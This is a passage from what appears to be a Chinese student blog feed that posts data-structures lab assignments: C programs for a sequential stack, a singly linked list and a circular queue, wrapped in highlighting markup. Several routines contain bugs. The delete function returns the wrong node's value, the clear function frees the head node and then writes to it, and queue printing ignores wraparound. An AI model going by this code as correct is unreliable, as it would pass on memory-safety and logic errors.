    &#123;printf(&quot;------  顺序栈创建成功\n&quot;);&#125;
    while(num!=0)
    &#123;
        &#123;
       num=OperateMenu(num);
    &#125;
    switch(num)
    &#123;
        case 1:    
            printf(&quot;输入入栈元素e:&quot;);
            scanf(&quot;%d&quot;,&amp;e);
            if(!Push(S,e))
            printf(&quot;输入不合法&quot;);
            else
            printf(&quot;已经将%d存入顺序栈\n&quot;, e);
            printf(&quot;顺序栈为\n&quot;);
            PrintStack(S);//输出栈
            printf(&quot;\n&quot;);break;
        case 2:
            if(StackEmpty(S))
            printf(&quot;栈为空栈\n&quot;);
            else
            &#123;Pop(S,e);
            printf(&quot;栈顶元素%d已删除\n&quot;,e);
            printf(&quot;\n&quot;);&#125;
            break;
        case 3:
            if(StackEmpty(S))
            printf(&quot;栈为空栈\n&quot;);
            else
            printf(&quot;不是空栈\n&quot;);break;
        case 4:
            if(StackEmpty(S))
            printf(&quot;栈为空栈\n&quot;);
            else
            &#123;
printf(&quot;顺序栈为\n&quot;);
PrintStack(S);//输出栈
            printf(&quot;\n&quot;);&#125;break;
        case 5:
        if(StackEmpty(S))
        printf(&quot;栈为空栈\n&quot;);
        else
        &#123;GetTop(S,e);
        printf(&quot;栈顶元素为：%d&quot;,e);
        printf(&quot;\n&quot;);&#125;
        break;
      &#125;
     &#125;
    &#125;
</code></pre>
]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构链表</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>实验项目名称：线性表的存储结构<br>实验目的与要求：<br>1.基础知识:掌握数据结构中线性表的相关知识;<br>掌握C或VC+ +语言中程序设计的方法。<br>2.程序功能:<br>(1)参考教材相关算法，分别用顺序式和链式两种存储结构实现线性表的操作;<br>(2)实现已建立线性表中元素的查找、插入和删除。<br>实验性质:验证性(4学时，其中顺序表2学时，链表2学时)<br>说明：程序包含的主要函数:主函数、操作界面、<br>建立空线性表、获取第i个元素的值、在第i个位<br>置前插入元素e、删除第i个元素且用e返回删除的<br>元素值。<br>注意：<br>(1) 应有相关注释，尤其是每个子函数的功能注释;<br>(2) 主函数调用子函数的逻辑顺序一主 函数调用建立线性表子函数应在调用其他子函数之前,这须在主函数中进行条件控制。<br>(3)在选定存储结构后，需要特别关注“表不存在”和“空表”的语句表达方式以及它们的使用时机和方式。<br>如:顺序表中，表达表不存在的语句是:L.elem=NULL ;<br>建立空表语句是:调用lnitList Sq (L) ;<br>在带头结点的链表中，表达表不存在的语句是:L=NULL;<br>建立空表语句是: L-&gt;next=NULL或者调用InitList_ L (L) ;</p>
<p>链式线性表</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">源代码：
<span class="token comment">#include&lt;stdio.h></span>
<span class="token comment">#include&lt;malloc.h></span>
<span class="token comment">#define ERROR 0</span>
<span class="token comment">#define OK 1</span>
typedef int Status<span class="token punctuation">;</span>
typedef int ElemType<span class="token punctuation">;</span>
typedef struct Lnode //结点类型
<span class="token punctuation">&#123;</span> ElemType data<span class="token punctuation">;</span> 
  struct Lnode *next<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>Lnode,*LinkList<span class="token punctuation">;</span>

Status InitList_L<span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span>//构建一个空链表 
<span class="token punctuation">&#123;</span>
    <span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token punctuation">(</span>LinkList<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>Lnode<span class="token punctuation">))</span><span class="token punctuation">;</span>
    L-<span class="token operator">></span>next <span class="token operator">=</span> NULL<span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status ListLnsert_L<span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L,int i,ElemType e<span class="token punctuation">)</span>//插入操作 
<span class="token punctuation">&#123;</span>
    LinkList p,s<span class="token punctuation">;</span>
    p <span class="token operator">=</span> L<span class="token punctuation">;</span>
    int <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    while<span class="token punctuation">(</span>p<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;</span>i-1<span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
          <span class="token assign-left variable">p</span><span class="token operator">=</span>p-<span class="token operator">></span>next<span class="token punctuation">;</span>
          ++j<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      if<span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token operator">||</span>j<span class="token operator">></span>i-1<span class="token punctuation">)</span>
      <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>
      s <span class="token operator">=</span> <span class="token punctuation">(</span>LinkList<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>Lnode<span class="token punctuation">))</span><span class="token punctuation">;</span>
      s-<span class="token operator">></span>data<span class="token operator">=</span>e<span class="token punctuation">;</span>
      s-<span class="token operator">></span>next<span class="token operator">=</span>p-<span class="token operator">></span>next<span class="token punctuation">;</span>
      p-<span class="token operator">></span>next<span class="token operator">=</span>s<span class="token punctuation">;</span>
      <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status ListDelete_L<span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L,int i,ElemType <span class="token operator">&amp;</span>e<span class="token punctuation">)</span>//删除操作 
<span class="token punctuation">&#123;</span>
    LinkList p,q<span class="token punctuation">;</span>
    p <span class="token operator">=</span> L<span class="token punctuation">;</span>
    int <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    while<span class="token punctuation">(</span>p-<span class="token operator">></span>next <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;</span>i-1<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token assign-left variable">p</span><span class="token operator">=</span>p-<span class="token operator">></span>next<span class="token punctuation">;</span>
        j++<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>p-<span class="token operator">></span>next<span class="token punctuation">)</span> <span class="token operator">||</span> j<span class="token operator">></span>i-1<span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>
    <span class="token assign-left variable">q</span><span class="token operator">=</span>p-<span class="token operator">></span>next<span class="token punctuation">;</span>
    p-<span class="token operator">></span>next<span class="token operator">=</span>q-<span class="token operator">></span>next<span class="token punctuation">;</span>
    e <span class="token operator">=</span> p-<span class="token operator">></span>data<span class="token punctuation">;</span>
    free<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status GetElem_L<span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L,int i,ElemType <span class="token operator">&amp;</span>e<span class="token punctuation">)</span>//查找操作 
<span class="token punctuation">&#123;</span>
    LinkList p<span class="token punctuation">;</span>
    int <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token assign-left variable">p</span><span class="token operator">=</span>L-<span class="token operator">></span>next<span class="token punctuation">;</span>
    while<span class="token punctuation">(</span>p<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token assign-left variable">p</span><span class="token operator">=</span>p-<span class="token operator">></span>next<span class="token punctuation">;</span>
        ++j<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    if<span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token operator">||</span>j<span class="token operator">></span>i<span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>
    <span class="token assign-left variable">e</span><span class="token operator">=</span>p-<span class="token operator">></span>data<span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status ClearList_L<span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span>//清空 
<span class="token punctuation">&#123;</span>
    LinkList p <span class="token operator">=</span> L<span class="token punctuation">;</span>
    while<span class="token punctuation">(</span>p-<span class="token operator">></span>next<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        LinkList m <span class="token operator">=</span> p-<span class="token operator">></span>next<span class="token punctuation">;</span>
        free<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token assign-left variable">p</span><span class="token operator">=</span>m<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    L-<span class="token operator">></span>next <span class="token operator">=</span> NULL<span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status PrintList_L<span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L,int len<span class="token punctuation">)</span>//输出 
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>L-<span class="token operator">></span>next<span class="token operator">!=</span>NULL<span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
	LinkList p <span class="token operator">=</span> L-<span class="token operator">></span>next<span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"单链表为：<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"%d<span class="token entity" title="\n">\n</span>"</span>,p-<span class="token operator">></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        p <span class="token operator">=</span> p-<span class="token operator">></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  printf<span class="token punctuation">(</span><span class="token string">"该链表为空表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status Operatemenu<span class="token punctuation">(</span>LinkList L<span class="token punctuation">)</span>  //操作菜单
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------****操作菜单****------<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span><span class="token string">"------    0 退出系统<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    1 插入一个元素<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    2 查找一个元素<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    3 删除一个元素<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    4 输出链表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    5 将链表重置为空表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    请选择你所需要的操作<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
int main<span class="token punctuation">(</span><span class="token punctuation">)</span>//主函数
<span class="token punctuation">&#123;</span>
	LinkList L<span class="token punctuation">;</span>
    ElemType e<span class="token punctuation">;</span>
    int <span class="token assign-left variable">len</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
	int <span class="token assign-left variable">num</span><span class="token operator">=</span>-1, i<span class="token punctuation">;</span>
	if<span class="token punctuation">(</span>InitList_L<span class="token punctuation">(</span>L<span class="token punctuation">))</span>
	<span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"------  链表创建成功<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
	while<span class="token punctuation">(</span>num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		Operatemenu<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>
        scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
	switch<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
     <span class="token keyword">case</span> <span class="token number">1</span>:
            len++<span class="token punctuation">;</span>
		    printf<span class="token punctuation">(</span><span class="token string">"分别输入储存地址i和储存元素e:<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		    scanf<span class="token punctuation">(</span><span class="token string">"%d %d"</span>,<span class="token operator">&amp;</span>i,<span class="token operator">&amp;</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            if<span class="token punctuation">(</span><span class="token operator">!</span>ListLnsert_L<span class="token punctuation">(</span>L,i,e<span class="token punctuation">))</span> // 判断i值是否合法
			   <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"i值不合法<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
			   printf<span class="token punctuation">(</span><span class="token string">"已经将%d存入链表<span class="token entity" title="\n">\n</span>"</span>, e<span class="token punctuation">)</span><span class="token punctuation">;</span>
               PrintList_L<span class="token punctuation">(</span>L,len<span class="token punctuation">)</span><span class="token punctuation">;</span>
               printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">2</span>:
		    printf<span class="token punctuation">(</span><span class="token string">"请输入查找的位置i:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            if<span class="token punctuation">(</span><span class="token operator">!</span>GetElem_L<span class="token punctuation">(</span>L,i,e<span class="token punctuation">))</span>// 判断i值是否合法
			  <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"i值不合法<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   
            <span class="token keyword">else</span>
			    printf<span class="token punctuation">(</span><span class="token string">"%d位置的元素为:"</span>, i<span class="token punctuation">)</span><span class="token punctuation">;</span>
				printf<span class="token punctuation">(</span><span class="token string">"%d<span class="token entity" title="\n">\n</span>"</span>,e<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">3</span>:
		    printf<span class="token punctuation">(</span><span class="token string">"请输入删除的位置i:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
		    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
			if<span class="token punctuation">(</span><span class="token operator">!</span>ListDelete_L<span class="token punctuation">(</span>L,i,e<span class="token punctuation">))</span> // 判断i值是否合法
			   <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"i值不合法<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
			  <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"已经将%d位置的元素删除<span class="token entity" title="\n">\n</span>"</span>, i<span class="token punctuation">)</span><span class="token punctuation">;</span>
              len--<span class="token punctuation">;</span>
              PrintList_L<span class="token punctuation">(</span>L,len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> 
			  <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">4</span>:
            PrintList_L<span class="token punctuation">(</span>L,len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">5</span>:ClearList_L<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>
            printf<span class="token punctuation">(</span><span class="token string">"已重置为空表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构队列</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p>实验项目名称：栈与队列操作的实现<br>实验目的与要求：<br>1.基础知识:掌握数据结构中栈和队列的相关知识;掌握C或VC++语言中程序设计的方法.<br>2.程序功能:<br>(1)参考教材相关算法，采用顺序存储存储实现栈的建立与初始化、入栈、出栈、判断栈空等操作;<br>(2)参考教材相关算法，采用顺序存储或链式存储实现队列的建立与初始化、销毁队列、入队列、出队列、判断队列为空等操作;<br>●实验性质:验证性(4学时，其中栈2学时，队列2学时)<br>说明：●说明:每种存储结构下算法实现均包含的主要函数有:主函数、操作界面、建栈(队列)、入栈(入队列)、出栈(出队列) ,应有相关注释。<br>注意：<br>(1) 主函数调用子函数的逻辑顺序一主函数调用建栈(建队列)子函数应在调用入/出栈(队列)等子函数之前，这须在主函数中进行条件控制。<br>(2)2.在选定存储结构后，需要特别关注“栈不存在”和“空栈”、“队列不存在”和“空队列”的语句表达方式以及它们的使用时机和方式。<br>顺序式队列<br>源代码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#include&lt;stdio.h></span>
<span class="token comment">#include&lt;malloc.h></span>
<span class="token comment">#define OVERFLOW  0</span>
<span class="token comment">#define OK 1</span>
<span class="token comment">#define ERROR 0</span>
<span class="token comment">#define QUEUE_MAXSIZE 100</span>
typedef int Status<span class="token punctuation">;</span>
typedef int QElemType<span class="token punctuation">;</span>
typedef struct 
<span class="token punctuation">&#123;</span>
    QElemType *base<span class="token punctuation">;</span>
    int front<span class="token punctuation">;</span>
    int rear<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>SqQueue<span class="token punctuation">;</span>

Status InitQueue<span class="token punctuation">(</span>SqQueue <span class="token operator">&amp;</span>Q<span class="token punctuation">)</span>//建立队列
<span class="token punctuation">&#123;</span>
    Q.base<span class="token operator">=</span><span class="token punctuation">(</span>QElemType*<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>QElemType<span class="token punctuation">)</span>*QUEUE_MAXSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    if<span class="token punctuation">(</span><span class="token operator">!</span>Q.base<span class="token punctuation">)</span>
    return<span class="token punctuation">(</span>OVERFLOW<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Q.front<span class="token operator">=</span>Q.rear<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status EnQueue<span class="token punctuation">(</span>SqQueue <span class="token operator">&amp;</span>Q, QElemType e<span class="token punctuation">)</span>//入队
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token variable"><span class="token punctuation">((</span>Q.rear<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span> QUEUE_MAXSIZE <span class="token operator">==</span> Q.front<span class="token punctuation">)</span>
    return ERROR<span class="token punctuation">;</span>
    Q.base[Q.rear]<span class="token operator">=</span>e<span class="token punctuation">;</span>
    Q.rear<span class="token operator">=</span><span class="token punctuation">(</span>Q.rear<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>QUEUE_MAXSIZE<span class="token punctuation">;</span>
    return OK<span class="token punctuation">;</span>
&#125;

Status DeQueue<span class="token punctuation">(</span>SqQueue <span class="token operator">&amp;</span>Q<span class="token punctuation">,</span>QElemType <span class="token operator">&amp;</span>e<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">/</span>出队
&#123;
    if<span class="token punctuation">(</span>Q.front<span class="token operator">==</span>Q.rear<span class="token punctuation">)</span>
    return ERROR<span class="token punctuation">;</span>
    e<span class="token operator">=</span>Q.base[Q.front]<span class="token punctuation">;</span>
    Q.front<span class="token operator">=</span><span class="token punctuation">(</span>Q.front<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>QUEUE_MAXSIZE<span class="token punctuation">;</span>
    return OK<span class="token punctuation">;</span>
&#125;

Status QueueEmpty<span class="token punctuation">(</span>SqQueue Q<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">/</span>判断是否是空队列
&#123;
    if<span class="token punctuation">(</span>Q.front<span class="token operator">==</span>Q.rear<span class="token punctuation">)</span>
    return OK<span class="token punctuation">;</span>
    else
    return ERROR<span class="token punctuation">;</span>
&#125;


Status PrintQueue<span class="token punctuation">(</span>SqQueue Q<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">/</span>输出全部元素
&#123;
    if<span class="token punctuation">(</span>Q.front<span class="token operator">==</span>Q.rear<span class="token punctuation">)</span>
    return ERROR<span class="token punctuation">;</span>
    else
    &#123;
        while<span class="token punctuation">(</span>Q.front<span class="token operator">&lt;</span>Q.rear<span class="token punctuation">)</span>
        &#123;
            printf<span class="token punctuation">(</span>"<span class="token operator">%</span>d "<span class="token punctuation">,</span>Q.base[Q.front]<span class="token punctuation">)</span><span class="token punctuation">;</span>
            Q.front<span class="token operator">=</span><span class="token punctuation">(</span>Q.front<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        &#125;
    &#125;
    return <span class="token number">0</span><span class="token punctuation">;</span>
&#125;

Status ClearQueue<span class="token punctuation">(</span>SqQueue <span class="token operator">&amp;</span>Q<span class="token punctuation">)</span>
&#123;
  
      Q.front<span class="token operator">=</span>Q.rear<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
      return OK<span class="token punctuation">;</span>
&#125;
Status OperateMenu<span class="token punctuation">(</span>int num<span class="token punctuation">)</span>
&#123;
    
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">**</span><span class="token operator">**</span>操作菜单<span class="token operator">**</span><span class="token operator">**</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>\n\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token number">0</span> 退出系统\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token number">1</span> 入队\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token number">2</span> 出队\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token number">3</span> 判断是否为空队列\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token number">4</span> 输出队列全部元素\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token number">5</span> 清空队列\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span>"<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    请选择你所需要的操作\n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span>"<span class="token operator">%</span>d"<span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
	return num<span class="token punctuation">;</span>
&#125;

int main<span class="token punctuation">(</span><span class="token punctuation">)</span>
&#123;
    SqQueue Q<span class="token punctuation">;</span>
    QElemType e<span class="token punctuation">;</span>
    int num<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    if<span class="token punctuation">(</span>InitQueue<span class="token punctuation">(</span>Q<span class="token punctuation">))</span></span>
    <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"------  顺序队列创建成功<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
    while<span class="token punctuation">(</span>num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#123;</span>
        <span class="token assign-left variable">num</span><span class="token operator">=</span>OperateMenu<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    switch<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span>:    
            printf<span class="token punctuation">(</span><span class="token string">"输入入队元素e:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            if<span class="token punctuation">(</span><span class="token operator">!</span>EnQueue<span class="token punctuation">(</span>Q,e<span class="token punctuation">))</span>
            printf<span class="token punctuation">(</span><span class="token string">"输入不合法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
            printf<span class="token punctuation">(</span><span class="token string">"已经将%d存入队列<span class="token entity" title="\n">\n</span>"</span>, e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            printf<span class="token punctuation">(</span><span class="token string">"队列为:<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             PrintQueue<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">;</span>//输出队
            printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span>:
            if<span class="token punctuation">(</span>QueueEmpty<span class="token punctuation">(</span>Q<span class="token punctuation">))</span>
